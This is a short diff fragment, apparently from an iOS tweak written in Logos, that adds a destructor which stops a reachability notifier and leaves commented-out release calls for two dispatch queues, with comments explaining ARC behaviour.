+// ----- 析构函数 (可选，用于清理) -----
+%dtor {
+    [DataZipper stopReachabilityNotifier];
+    // In ARC mode, manual release of GCD queues is generally not needed for global queues.
+    // They are automatically cleaned up when the process terminates.
+    // Explicitly calling dispatch_release in an ARC environment causes a compilation error.
+    // Hence, these lines are commented out.
+    /*
+    if (g_task_queue) {
+        // dispatch_release(g_task_queue);
+        g_task_queue = NULL;
+    }
+    if (g_upload_queue) {
+        // dispatch_release(g_upload_queue);
+        g_upload_queue = NULL;
+    }
+    */
+}
